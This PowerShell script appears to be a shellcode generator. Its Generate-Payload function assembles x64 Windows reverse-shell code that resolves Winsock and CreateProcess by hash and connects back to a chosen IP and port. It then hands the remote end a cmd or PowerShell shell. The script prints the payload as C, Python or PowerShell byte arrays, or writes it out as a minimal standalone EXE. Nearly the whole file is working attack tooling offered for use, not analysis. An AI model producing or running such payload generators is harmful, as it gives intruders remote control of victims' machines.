# If there are any issues, please send me a message on discord

function Generate-Payload {
    param (
        [string] $ip = "127.0.0.1",
        [int] $port = 443,
        [string] $type = "cmd",
        [string] $output = "CArray"
    )

    # Validate Parameters

    foreach ($octet in $ip.split(".")) {
        if ([int] $part -notin 0..255) {
            throw "[!] Invalid IP"
        }
    }

    if ($port -notin 0..65535) {
        throw "[!] Invalid port"
    }

    if ($type -notin ("cmd", "powershell")) {
        throw "[!] Invalid shell type"
    }

    $esc = [char]0x1b
    $blu = "$esc[38;2;83;146;255m"
    $end = "$esc[0m"

    echo "`n$blu[*]$end Shellcode Settings:"
    echo "**** IP:          $ip"
    echo "**** Port:        $port"
    echo "**** Shell Type:  $type"
    echo "**** Format:      $output"

    # Convert IP to appropriate instruction

    function convert-ip {
        $ip_hex_octets = $ip.split(".") | % { "{0:x2}" -f [int] $_ }
        $ip_hex_reverse =  $ip_hex_octets[-1..-($ip_hex_octets.length)] -join ""
        return "mov edx, 0x{0:x8}" -f $ip_hex_reverse
    }

    $ip_instruction = convert-ip

    # Convert port to appropriate instruction

    function convert-port {
        $port_hex_string =  "{0:x4}" -f $port
        $port_part_1 = $port_hex_string.substring(2, 2)
        $port_part_2 = $port_hex_string.substring(0, 2)
        return "mov dx, 0x$port_part_1$port_part_2"
    }

    $port_instruction = convert-port

    # Provide correct instruction to either cmd or powershell

    switch ($type) {
        "cmd" {
            $shell_instruction = "mov rdx, 0x6578652e646d63"
        }
        "powershell" {
            $shell_instruction = "sub rsp, 8", "mov rdx, 0xffff9a879ad19393", "not rdx", "push rdx", "mov rdx, 0x6568737265776f70" -join "`n"
        }
    }

    # Prepare assembly

    $asm = @"
        BITS 64
    
        find_kernel32:
            xor rdx, rdx
            mov rax, gs:[rdx+0x60]
            mov rsi,[rax+0x18]
            mov rsi,[rsi + 0x30]
            mov r9, [rsi]
            mov r9, [r9]
            mov r9, [r9+0x10]
            jmp jump_section
        parse_module:
            mov ecx, [r9 + 0x3c]
            xor r15, r15
            mov r15b, 0x88
            add r15, r9
            add r15, rcx
            mov r15d, [r15]
            add r15, r9
            mov ecx, [r15 + 0x18]
            mov r14d, [r15 + 0x20]
            add r14, r9
        search_function:
            jrcxz not_found
            dec ecx
            xor rsi, rsi
            mov esi, [r14 + rcx*4]
            add rsi, r9
        function_hashing:
            xor rax, rax
            xor rdx, rdx
            cld
        iteration:
            lodsb
            test al, al
            jz compare_hash
            ror edx, 0x0d
            add edx, eax
            jmp iteration
        compare_hash:
            cmp edx, r8d
            jnz search_function
            mov r10d, [r15 + 0x24]
            add r10, r9
            movzx ecx, word [r10 + 2*rcx]
            mov r11d, [r15 + 0x1c]
            add r11, r9
            mov eax, [r11 + 4*rcx]
            add rax, r9
            ret
        not_found:
            ret
        jump_section:
            mov rbp, r9
            mov r8d, 0xec0e4e8e
            call parse_module
            mov r12, rax
        load_module:
            xor rax, rax
            mov ax, 0x6c6c
            push rax
            mov rax, 0x642E32335F325357
            push rax
            mov rcx, rsp
            sub rsp, 0x20
            mov rax, r12
            call rax
            add rsp, 0x20
            mov r14, rax
        call_wsastartup:
            mov r9, rax
            mov r8d, 0x3bfcedcb
            mov rbx, r9
            call parse_module
            xor rcx, rcx
            mov cx, 0x198
            sub rsp, rcx
            lea rdx, [rsp]
            mov cx, 0x202
            sub rsp, 0x30
            call rax
            add rsp, 0x30
        call_wsasocket:
            mov r9, rbx
            mov r8d, 0xadf509d9
            call parse_module
            sub rsp, 0x30
            xor rcx, rcx
            mov cl, 2
            xor rdx, rdx
            mov dl, 1
            xor r8, r8
            mov r8b, 6
            xor r9, r9
            mov [rsp+0x20], r9
            mov [rsp+0x28], r9
            call rax
            mov r12, rax
            add rsp, 0x30
        call_wsaconnect:
            mov r9, rbx
            mov r8d, 0xb32dba0c
            call parse_module
            sub rsp, 0x20
            mov rcx, r12
            xor rdx, rdx
            mov dl, 2
            mov [rsp], rdx
            xor rdx, rdx
            $port_instruction
            mov [rsp+2], rdx
            $ip_instruction
            mov [rsp+4], rdx
            lea rdx, [rsp]
            xor r8, r8
            mov r8b, 0x16
            xor r9, r9
            sub rsp, 0x38
            mov [rsp+0x20], r9
            mov [rsp+0x28], r9
            mov [rsp+0x30], r9
            call rax
            add rsp, 0x38
        call_createprocess:
            mov r9, rbp
            mov r8d, 0x16b3fe72
            call parse_module
            $shell_instruction
            push rdx
            mov rdx, rsp
            push r12
            push r12
            push r12
            xor rcx, rcx
            push cx
            push rcx
            push rcx
            mov cl, 0xff
            inc cx
            push cx
            xor rcx, rcx
            push cx
            push cx
            push rcx
            push rcx
            push rcx
            push rcx
            push rcx
            push rcx
            mov cl, 0x68
            push rcx
            mov rdi, rsp
            mov rcx, rsp
            sub rcx, 0x20
            push rcx
            push rdi
            xor rcx, rcx
            push rcx
            push rcx
            xor rcx, rcx
            mov rcx, 0x08000000
            push rcx
            xor rcx, rcx
            inc rcx
            push rcx
            dec cl
            push rcx
            push rcx
            push rcx
            push rcx
            mov r8, rcx
            mov r9, rcx
            call rax
"@

    # Function to ensure files are not overwritten

    function random-name {
        return  -join ((48..57 + 65..90 + 97..122) | get-random -c 24 | % {[char]$_})
    }

    # Generate assembled code

    $asm_file = random-name
    $raw_shellcode = random-name
    set-content $asm_file $asm
    nasm -f bin -o $raw_shellcode $asm_file | out-null
    remove-item $asm_file -force
    $shellcode = [system.io.file]::readallbytes($(resolve-path $raw_shellcode))

    $shellcode_size = (get-item $(resolve-path $raw_shellcode)).length

    echo "`n$blu[*]$end Shellcode Size: $shellcode_size"

    # Prepare minimal EXE header

    $exe_header = 0x4d, 0x5a, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x22, 0x00, 0x0b, 0x02, 0x00, 0x00,
                  0xe4, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
                  0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x70, 0x02, 0x00, 0x00, 0x8c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

    # Format shellcode for use cases

    echo "`n$blu[*]$end Shellcode Format for $output`n"

    switch ($output) {
        "Asm" {
            $formatted_shellcode = @()
            $string_shellcode = $shellcode | % { "{0:x2}" -f $_ }
            for ($i = 0; $i -lt $string_shellcode.count; $i += 16) {
                $formatted_shellcode += "    db 0x" + ($string_shellcode[$i..([math]::min($i + 15, $string_shellcode.count - 1))] -join ", 0x").tolower()
            }
            $output = $formatted_shellcode -join "`n"
            $output
        }
        "CArray" {
            $formatted_shellcode = @()
            $string_shellcode = $shellcode | % { "{0:x2}" -f $_ }
            for ($i = 0; $i -lt $string_shellcode.count; $i += 16) {
                $formatted_shellcode += "0x" + ($string_shellcode[$i..([math]::min($i + 15, $string_shellcode.count - 1))] -join ", 0x").tolower()
            }
            $output = "unsigned char buf[$shellcode_size] = {", ("    " + ($formatted_shellcode -join ",`n    ")), "};" -join "`n"
            $output
        }
        "CString" {
            $formatted_shellcode = @()
            $string_shellcode = $shellcode | % { "{0:x2}" -f $_ }
            for ($i = 0; $i -lt $string_shellcode.count; $i += 16) {
                $formatted_shellcode += "`"" + ("\x" + ($string_shellcode[$i..([math]::min($i + 15, $string_shellcode.count - 1))] -join "\x") + "`";").tolower()
            }
            $output = "unsigned char buf[$shellcode_size] = `n    " + ($formatted_shellcode -join "`n    ")
            $output
        }
        "Python" {
            $formatted_shellcode = @()
            $string_shellcode = $shellcode | % { "{0:x2}" -f $_ }
            for ($i = 0; $i -lt $string_shellcode.count; $i += 16) {
                if ($i -eq 0) {
                    $formatted_shellcode += "buf =  b`"\x" + ($string_shellcode[$i..([math]::min($i + 15, $string_shellcode.count - 1))] -join "\x").tolower() + "`""
                } else {
                    $formatted_shellcode += "buf += b`"\x" + ($string_shellcode[$i..([math]::min($i + 15, $string_shellcode.count - 1))] -join "\x").tolower() + "`""
                }
            }
            $output = $formatted_shellcode -join "`n"
            $output
        }
        "Powershell" {
            $string_shellcode = $shellcode | % { "{0:x2}" -f $_ }
            $formatted_shellcode = ($string_shellcode -join ", 0x").tolower()
            $output = "[byte[]] `$buf = 0x$formatted_shellcode"
            $output
        }
        "exe" {
            $exe = $exe_header + $shellcode
            $file = random-name
            [system.io.file]::writeallbytes("$(pwd)\$file.exe", $exe)
            if (test-path "$(pwd)\$file.exe") {
                $exe_size = (get-item "$(pwd)\$file.exe").length
                echo "$esc[38;2;83;146;255m[i]$esc[0m $file.exe was successfully created"
                echo "$esc[38;2;83;146;255m[i]$esc[0m Total EXE Size: $exe_size"
            } else {
                throw "[!] Error creating file"
            }
        }
    }
    remove-item $raw_shellcode -force
}
